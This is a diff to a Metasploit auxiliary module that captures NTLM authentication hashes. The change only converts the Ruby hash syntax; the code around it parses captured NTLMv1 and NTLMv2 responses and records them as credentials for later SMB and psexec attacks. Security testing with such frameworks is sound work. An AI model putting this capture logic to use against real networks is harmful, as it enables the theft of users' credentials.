@@ -148,9 +148,9 @@ class Metasploit3 < Msf::Auxiliary
       nt_len = ntlm_hash.length
 
       if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
-        arg = { :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
-          :lm_hash => lm_hash,
-          :nt_hash => ntlm_hash
+        arg = { ntlm_ver: NTLM_CONST::NTLM_V1_RESPONSE,
+          lm_hash: lm_hash,
+          nt_hash: ntlm_hash
         }
 
         if arg[:lm_hash][16,32] == '0' * 32
@@ -159,11 +159,11 @@ class Metasploit3 < Msf::Auxiliary
       # if the length of the ntlm response is not 24 then it will be bigger and represent
       # a ntlmv2 response
       elsif nt_len > 48 #lmv2/ntlmv2
-        arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
-          :lm_hash   => lm_hash[0, 32],
-          :lm_cli_challenge  => lm_hash[32, 16],
-          :nt_hash   => ntlm_hash[0, 32],
-          :nt_cli_challenge  => ntlm_hash[32, nt_len  - 32]
+        arg = { ntlm_ver: NTLM_CONST::NTLM_V2_RESPONSE,
+          lm_hash: lm_hash[0, 32],
+          lm_cli_challenge: lm_hash[32, 16],
+          nt_hash: ntlm_hash[0, 32],
+          nt_cli_challenge: ntlm_hash[32, nt_len  - 32]
         }
       elsif nt_len == 0
         print_status("Empty hash from #{host} captured, ignoring ... ")
@@ -237,37 +237,37 @@ class Metasploit3 < Msf::Auxiliary
       # Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly
       case ntlm_ver
       when NTLM_CONST::NTLM_V1_RESPONSE
-        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
-                :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })
+        if NTLM_CRYPT::is_hash_from_empty_pwd?({hash: [nt_hash].pack("H*"),srv_challenge: @challenge,
+                ntlm_ver: NTLM_CONST::NTLM_V1_RESPONSE, type: 'ntlm' })
           print_status("NLMv1 Hash correspond to an empty password, ignoring ... ")
           return
         end
         if (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
           lm_hash_message = "Disabled"
-        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
-                :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })
+        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({hash: [lm_hash].pack("H*"),srv_challenge: @challenge,
+                ntlm_ver: NTLM_CONST::NTLM_V1_RESPONSE, type: 'lm' })
           lm_hash_message = "Disabled (from empty password)"
         else
           lm_hash_message = lm_hash
           lm_chall_message = lm_cli_challenge
         end
       when NTLM_CONST::NTLM_V2_RESPONSE
-        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
-                :cli_challenge => [nt_cli_challenge].pack("H*"),
-                :user => Rex::Text::to_ascii(user),
-                :domain => Rex::Text::to_ascii(domain),
-                :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })
+        if NTLM_CRYPT::is_hash_from_empty_pwd?({hash: [nt_hash].pack("H*"),srv_challenge: @challenge,
+                cli_challenge: [nt_cli_challenge].pack("H*"),
+                user: Rex::Text::to_ascii(user),
+                domain: Rex::Text::to_ascii(domain),
+                ntlm_ver: NTLM_CONST::NTLM_V2_RESPONSE, type: 'ntlm' })
           print_status("NTLMv2 Hash correspond to an empty password, ignoring ... ")
           return
         end
         if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
           lm_hash_message = "Disabled"
           lm_chall_message = 'Disabled'
-        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
-                :cli_challenge => [lm_cli_challenge].pack("H*"),
-                :user => Rex::Text::to_ascii(user),
-                :domain => Rex::Text::to_ascii(domain),
-                :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })
+        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({hash: [lm_hash].pack("H*"),srv_challenge: @challenge,
+                cli_challenge: [lm_cli_challenge].pack("H*"),
+                user: Rex::Text::to_ascii(user),
+                domain: Rex::Text::to_ascii(domain),
+                ntlm_ver: NTLM_CONST::NTLM_V2_RESPONSE, type: 'lm' })
           lm_hash_message = "Disabled (from empty password)"
           lm_chall_message = 'Disabled'
         else
@@ -276,9 +276,9 @@ class Metasploit3 < Msf::Auxiliary
         end
 
       when NTLM_CONST::NTLM_2_SESSION_RESPONSE
-        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
-                :cli_challenge => [lm_hash].pack("H*")[0,8],
-                :ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })
+        if NTLM_CRYPT::is_hash_from_empty_pwd?({hash: [nt_hash].pack("H*"),srv_challenge: @challenge,
+                cli_challenge: [lm_hash].pack("H*")[0,8],
+                ntlm_ver: NTLM_CONST::NTLM_2_SESSION_RESPONSE, type: 'ntlm' })
           print_status("NTLM2_session Hash correspond to an empty password, ignoring ... ")
           return
         end
@@ -327,18 +327,18 @@ class Metasploit3 < Msf::Auxiliary
       # Rem : one report it as a smb_challenge on port 445 has breaking those hashes
       # will be mainly use for psexec / smb related exploit
       report_auth_info(
-        :host  => ip,
-        :port => 445,
-        :sname => 'smb_challenge',
-        :user => user,
-        :pass => domain + ":" +
+        host: ip,
+        port: 445,
+        sname: 'smb_challenge',
+        user: user,
+        pass: domain + ":" +
           ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
           ( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
           datastore['CHALLENGE'].to_s,
-        :type => smb_db_type_hash,
-        :proof => "DOMAIN=#{domain}",
-        :source_type => "captured",
-        :active => true
+        type: smb_db_type_hash,
+        proof: "DOMAIN=#{domain}",
+        source_type: "captured",
+        active: true
       )
       #if(datastore['LOGFILE'])
       #  File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
